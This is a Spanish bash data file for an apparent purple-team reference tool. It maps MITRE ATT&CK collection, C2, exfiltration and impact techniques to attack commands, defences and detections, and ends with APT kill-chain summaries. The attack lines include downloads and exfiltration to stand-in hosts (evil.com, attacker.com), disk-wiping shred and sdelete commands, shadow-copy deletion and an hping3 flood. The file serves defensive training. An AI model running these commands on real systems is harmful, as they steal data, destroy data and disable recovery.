#!/bin/bash
# Extensión de mitre_data.sh - Parte 3

# TA0009 - Collection
PURPLE_DATA["T1114"]="
📝 DESCRIPCIÓN: Recolección de Correos (PST, OST, Webmail).
|||
🔴 ATAQUE — Email Collection:
  • Grab_PST.ps1 o ninja.exe descargando Outlook logs en TARGET.
  • Delegación masiva en Exchange hacia cuenta comprometida.
|||
🔵 DEFENSA:
  • Cifrado robusto en repositorios de correo in-transit y at-rest.
|||
🟣 DETECCIÓN:
  • Reglas de Exchange: Alerta por 'Mailbox Export Request' o por creación de forwarding a dominios externos."

PURPLE_DATA["T1005"]="
📝 DESCRIPCIÓN: Recolección de Datos desde el Sistema Local (Documentos, Bases de Datos locales).
|||
🔴 ATAQUE — Data from Local System:
  • find / -name \"*.pdf\" -o -name \"*.docx\" -exec cp {} /tmp/loot/ \\; (TARGET_LINUX)
  • robocopy /S C:\\Users\\* C:\\Windows\\Temp\\loot *.docx *.xlsx (TARGET_WIN)
|||
🔵 DEFENSA:
  • Cifrado BitLocker/FileVault. Restringir acceso al disco local entero por parte de apps (EFS).
|||
🟣 DETECCIÓN:
  • FIM: Actividad masiva de lectura y copiado de un árbol completo de documentos por un proceso inusual."

PURPLE_DATA["T1039"]="
📝 DESCRIPCIÓN: Exfiltración de un Recurso Compartido de Red.
|||
🔴 ATAQUE — Data from Network Shared Drive:
  • smbclient //TARGET/Finance -U user%pass -c \"recurse; mget *\"
|||
🔵 DEFENSA:
  • Monitoreo de acceso y auditorías en FileServer y Sharepoint.
|||
🟣 DETECCIÓN:
  • Event ID 5145: Acceso hiper detallado al recurso compartido. Volumen inusual de Bytes leídos."

PURPLE_DATA["T1113"]="
📝 DESCRIPCIÓN: Captura de pantalla para ver qué hace el usuario o qué tiene en memoria.
|||
🔴 ATAQUE — Screen Capture:
  • meterpreter > screenshare (en TARGET)
  • Invoke-Specter -Screenshot (PowerSploit)
|||
🔵 DEFENSA:
  • EDR mitigando inyección en procesos de Windows Manager (dwm.exe).
|||
🟣 DETECCIÓN:
  • Llamadas excesivas a las APIs BitBlt, GetDC, o PrintWindow en un bucle temporal."

# TA0011 - Command and Control (C2)
PURPLE_DATA["T1071"]="
📝 DESCRIPCIÓN: C2 sobre Protocolo de Capa de Aplicación (HTTP, HTTPS, DNS, SMTP).
|||
🔴 ATAQUE — Application Layer Protocol:
  • Cobalt Strike Beacon conectando vía HTTPS a C2 (vía TARGET).
  • dnscat2 u iodine tunnel sobre DNS.
|||
🔵 DEFENSA:
  • Terminar SSL/TLS en proxy corporativo (SSL Decryption) para inspección.
|||
🟣 DETECCIÓN:
  • Alerta en balizas HTTPS: Beacons con longitud constante, intervalos predecibles (jitter) o User-Agents inusuales (Python-urllib)."

PURPLE_DATA["T1095"]="
📝 DESCRIPCIÓN: Protocolos no estándar (UDP, ICMP o RAW sockets) para bypass.
|||
🔴 ATAQUE — Non-Application Layer Protocol:
  • icmptunnel para llevar paquetes IP ocultos en ping echo/reply hacia/desde TARGET.
|||
🔵 DEFENSA:
  • Filtrar ICMP saliente, y restringir reglas perimetrales.
|||
🟣 DETECCIÓN:
  • NetFlow: Payload desproporcionadamente largo en paquetes ICMP."

PURPLE_DATA["T1572"]="
📝 DESCRIPCIÓN: Protocol Tunneling (SSH sobre HTTPS, tunelización profunda).
|||
🔴 ATAQUE — Protocol Tunneling:
  • Chisel server en ATTACKER, chisel client en TARGET (ssh -R).
  • ligolo-ng para routing interno inverso total.
|||
🔵 DEFENSA:
  • Strict Proxy y segmentación.
|||
🟣 DETECCIÓN:
  • Proxy Logs: Flujo binario oscuro en protocolo WebSockets o TLS que no es HTTP válido."

PURPLE_DATA["T1090"]="
📝 DESCRIPCIÓN: Conexión C2 usando proxies o infraestructura pivot para ofuscar el origen real.
|||
🔴 ATAQUE — Proxy:
  • Proxychains enlazando saltos internos de TARGET hacia Internet a través de un nodo SOCKS5.
|||
🔵 DEFENSA:
  • Whitelist estricta de puertos Proxy internos.
|||
🟣 DETECCIÓN:
  • NetFlow: Conexiones de un Server Web DMZ abriendo sockets contra Active Directory Interno."

PURPLE_DATA["T1105"]="
📝 DESCRIPCIÓN: Transferencia de herramientas (Malware, Utils) hacia el origen de recolección.
|||
🔴 ATAQUE — Ingress Tool Transfer:
  • wget http://evil.com/linpeas.sh -O /tmp/lp.sh (TARGET_LINUX)
  • curl.exe -o C:\\Temp\\mimikatz.exe http://evil.com/mz.exe (TARGET_WIN)
|||
🔵 DEFENSA:
  • Bloquear dominios newly registered (NRDs), dominios maliciosos conocidos, e IP sin dominio en el Firewall.
|||
🟣 DETECCIÓN:
  • Proxy Logs: 'curl', 'wget', 'certutil' descargarndo arhivos .exe, .sh, .ps1, .dll."

# TA0010 - Exfiltration
PURPLE_DATA["T1048"]="
📝 DESCRIPCIÓN: Exfiltración sobre Protocolo Alternativo (Ej. FTP, SSH out, ICMP out).
|||
🔴 ATAQUE — Exfil Over Alternative Protocol:
  • scp /tmp/loot.zip root@attacker.com:/var/www/html (desde TARGET)
  • ping -p [HEX_DATA] attacker.com
|||
🔵 DEFENSA:
  • Data Loss Prevention (DLP) para interceptar movimientos masivos fuera de la red.
|||
🟣 DETECCIÓN:
  • Firewalls perimetrales detectando tráfico FTP/SSH saliente desde subnet no autorizada."

PURPLE_DATA["T1041"]="
📝 DESCRIPCIÓN: Exfiltración sobre el mismo canal de Comando y Control establecido (C2).
|||
🔴 ATAQUE — Exfiltration Over C2 Channel:
  • download C:\\Users\\Boss\\Passwords.kdbx (en consola Cobalt/Meterpreter en TARGET).
|||
🔵 DEFENSA:
  • Limitar el ancho de banda y tamaño de sesión para hosts que no necesiten subir data externa.
|||
🟣 DETECCIÓN:
  • Alertas de UEBA: Múltiples gigabytes exfiltrados en una conexión HTTPS asimétrica (mucho upload, poco download)."

PURPLE_DATA["T1567"]="
📝 DESCRIPCIÓN: Uso de servicios web válidos (GitHub, Google Drive, Mega) para exfiltrar y evadir bloqueos de dominios.
|||
🔴 ATAQUE — Exfiltration Over Web Service:
  • Rclone subiendo datos de TARGET hacia una cuenta de Mega o AWS S3 externa.
|||
🔵 DEFENSA:
  • CASB (Cloud Access Security Broker) bloqueando acceso a tenants no corporativos.
|||
🟣 DETECCIÓN:
  • Proxy Logs: Conexiones anómalas por volumen subido hacia Mega o subdominios no oficiales de O365."

PURPLE_DATA["T1020"]="
📝 DESCRIPCIÓN: Exfiltración Automatizada.
|||
🔴 ATAQUE — Automated Exfiltration:
  • Script en bash cronificado que empaqueta tar.gz y hace curl -F a un Webhook cada noche en TARGET.
|||
🔵 DEFENSA:
  • Filtrado de contenido/DLP que detecte formato comprimido opaco con firmas mágicas.
|||
🟣 DETECCIÓN:
  • Patrón periódico y rítmico (Jitter bajo) en los Firewall de salida."

# TA0040 - Impact
PURPLE_DATA["T1485"]="
📝 DESCRIPCIÓN: Destrucción de datos para interrumpir su disponibilidad, usando herramientas de Wipe/Shred.
|||
🔴 ATAQUE — Data Destruction:
  • sudo shred -zvu -n 3 /* (Destrucción total en TARGET Linux)
  • sdelete.exe -p 5 -s C:\\* (Destrucción en TARGET Win)
|||
🔵 DEFENSA:
  • Backups inmutables y offline regulares. Plan DRP probado y verificado.
|||
🟣 DETECCIÓN:
  • I/O Disk altísimo detectado por monitoreo (Zabbix/Prometheus).
  • Alertas de EDR por binarios como Sysinternals SDelete usados masivamente."

PURPLE_DATA["T1486"]="
📝 DESCRIPCIÓN: Cifrar datos por Impacto (Ransomware).
|||
🔴 ATAQUE — Data Encrypted for Impact:
  • LockBit/WannaCry payloads ejecutados en masa vía GPO en el DC hacia todos los TARGETs.
|||
🔵 DEFENSA:
  • Segmentar red plana, LAPS, desactivar privilegios de dominios locales, backups out-of-band.
|||
🟣 DETECCIÓN:
  • File Server Resource Manager (FSRM) bloqueando extensiones de ransomware conocidas.
  • Honeypots (archivos trampa): si se cifran o modifican, aísla el host automáticamente."

PURPLE_DATA["T1490"]="
📝 DESCRIPCIÓN: Inhibir la recuperación del SO borrando Shadow Copies o Boot Records.
|||
🔴 ATAQUE — Inhibit System Recovery:
  • vssadmin.exe Delete Shadows /All /Quiet (en TARGET)
  • bcdedit /set {default} recoveryenabled No
  • wmic shadowcopy delete
|||
🔵 DEFENSA:
  • Tamper protection previniendo alteración en vssadmin.
|||
🟣 DETECCIÓN:
  • Sysmon/EDR: Ejecución de vssadmin y bcdedit alertando de forma crítica e inmediata."

PURPLE_DATA["T1498"]="
📝 DESCRIPCIÓN: Denegación de servicio en red.
|||
🔴 ATAQUE — Network Denial of Service:
  • hping3 --flood -S -p 80 TARGET
  • Amplificación NTP/DNS contra las IPs de la empresa externa.
|||
🔵 DEFENSA:
  • Servicios Anti-DDoS (Cloudflare, Akamai).
|||
🟣 DETECCIÓN:
  • Alerta volumétrica proveniente del NOC / WAF / ISP."

PURPLE_DATA["T1496"]="
📝 DESCRIPCIÓN: Cryptojacking. Secuestro de recursos (CPU/GPU) para minado de criptomonedas.
|||
🔴 ATAQUE — Resource Hijacking:
  • XMRig minero desplegado como servicio oculto csrss_update.exe en TARGET.
|||
🔵 DEFENSA:
  • Monitoreo de Host: Umbrales de CPU en >95% continuos alertan al SOC.
|||
🟣 DETECCIÓN:
  • Conexiones a pools de minería conocidos bloqueados o detectados por proxy."


# ==========================================================
# ACTUALIZACIÓN DE APT KILLCHAIN PARA USAR TARGET
# ==========================================================

APT_KILLCHAIN["APT29"]="1.(Reconocimiento) Enviar Spear Phishing con .LNK / adjunto Office a empleados de TARGET|2.(Ejecución) Ejecutar PowerShell obfuscado (T1059) al hacer clic|3.(C2) Backdoor SUNBURST/WellMess instalado en memoria en TARGET (T1055)|4.(Descubrimiento) BloodHound lanzado para mapeo interno desde TARGET (T1018)|5.(Movimiento Lateral) Pivote vía RDP / WMI a otros servidores|6.(Credenciales) Kerberoasting contra Controladores de Dominio de TARGET (T1558)|7.(Exfiltración) Robo de emails O365 corporativos y exfiltración HTTP a C2 (T1041)|8.(Evasión) Limpieza de logs (T1070) con persistencia DCOM oculta (T1505)"

APT_KILLCHAIN["APT38"]="1.(Acceso Inicial) Enviar Spear Phishing con oportunidad laboral a sysadmin de TARGET|2.(Ejecución) Dropper BLINDINGCAN ejecutado en TARGET (T1059)|3.(Descubrimiento) Scaneo silencioso (T1046) del entorno financiero (SWIFT) de TARGET|4.(Escalada) Explotación LPE y volcado de LSASS en servidor de transacciones|5.(C2) HOPLIGHT o FALLCHILL instalado con HTTP C2 proxyizado (T1090) hacia RPDC|6.(Impacto/Exfil) Transferencias monetarias fraudulentas emitidas por TARGET (T1565)|7.(Impacto/Destrucción) DESTOVER wiper borra el Boot Record de TARGET (T1485) para destruir evidencias|8.(Defensa) Lavado de fondos mediante Tumblers Cripto externos"

APT_KILLCHAIN["FIN7"]="1.(Acceso Inicial) Ataque físico (USB rubber ducky) o Phishing a POS Retailer en TARGET filial|2.(Ejecución) BABYMETAL/BIRDWATCH backdoor implementado (PowerShell T1059)|3.(C2) Carbanak / DICELOADER habilitando red C2 en TARGET|4.(Movimiento) Expansión hacia las Terminales de Punto de Venta (POS)|5.(Credenciales) Inyección de Keylogger (T1056) en procesos de pago de tarjetas en TARGET|6.(Recolección) Extracción de Track1/Track2 MSR vía DNS exfil|7.(Impacto) Despliegue de ransomware ALPHV/BlackCat (T1486) como cortina de humo destructiva|8.(Exfil) Datos y archivos internos robados puestos a la venta en DarkWeb por FIN7"
